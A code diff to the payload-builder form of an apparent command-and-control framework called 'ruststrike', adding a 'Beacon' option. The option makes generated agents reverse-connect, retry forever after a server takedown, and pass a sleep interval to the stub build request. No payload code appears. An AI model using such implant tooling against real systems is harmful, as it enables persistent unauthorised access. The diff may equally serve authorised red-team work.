@@ -46,7 +46,18 @@
         <div class="field">
           <label>Sleep Time (seconds)</label>
           <input v-model.number="form.sleep_time" type="number" min="1" max="3600" placeholder="e.g. 5" required />
-          <p class="hint">Interval between agent check-ins (1-3600 seconds)</p>
+          <p class="hint">
+            Callback interval for <strong>Beacon</strong> agents (1-3600 seconds) — baked into the stub so the agent checks in at this cadence. Ignored by the stock implant, which holds a persistent channel.
+          </p>
+        </div>
+        <div class="field field-check">
+          <label class="check">
+            <input v-model="form.beacon" type="checkbox" />
+            <span>Beacon (auto-reconnect)</span>
+          </label>
+          <p class="hint">
+            Generate a beacon agent instead of the stock implant: it reverse-connects, and when the server closes or is unreachable it sleeps the Sleep Time (±jitter-free) and checks in again — forever. Restart or take down the server without losing the agent. Relay/pivot is disabled on a beacon (intermittent link).
+          </p>
         </div>
         <div class="field field-check">
           <label class="check">
@@ -103,6 +114,7 @@ const form = reactive({
   host: getDefaultCallbackHost(),
   sleep_time: 5,
   silent: true,
+  beacon: false,
   callbackMode: 'direct'
 })
 
@@ -118,6 +130,7 @@ const loadCachedForm = () => {
     form.sleep_time = Number(cached.sleep_time || form.sleep_time)
     form.agent_type = cached.agent_type || form.agent_type
     form.silent = cached.silent ?? form.silent
+    form.beacon = cached.beacon ?? form.beacon
     // callbackMode is session-scoped (relays are transient) — don't restore it.
   } catch {}
 }
@@ -127,7 +140,8 @@ const saveCachedForm = () => {
     host: form.host,
     sleep_time: form.sleep_time,
     agent_type: form.agent_type,
-    silent: form.silent
+    silent: form.silent,
+    beacon: form.beacon
   }))
 }
 
@@ -188,8 +202,16 @@ const submit = async () => {
       : String(props.listener?.port ?? '')
     const safeName = String(props.listener?.name || 'agent').replace(/[^a-z0-9_-]/gi, '_')
     const via = isRelayMode.value ? `_via_${form.callbackMode}` : ''
-    const name = `ruststrike_${safeName}_${form.host}_${port}${via}`
-    const res = await api.post('/stub/build', { host: form.host, port, name, silent: form.silent })
+    const variant = form.beacon ? '_beacon' : ''
+    const name = `ruststrike${variant}_${safeName}_${form.host}_${port}${via}`
+    const res = await api.post('/stub/build', {
+      host: form.host,
+      port,
+      name,
+      silent: form.silent,
+      beacon: form.beacon,
+      sleep: form.sleep_time,
+    })
     const p = res.data?.data?.path
     if (!p) {
       // empty path = operator cancelled the Save As dialog
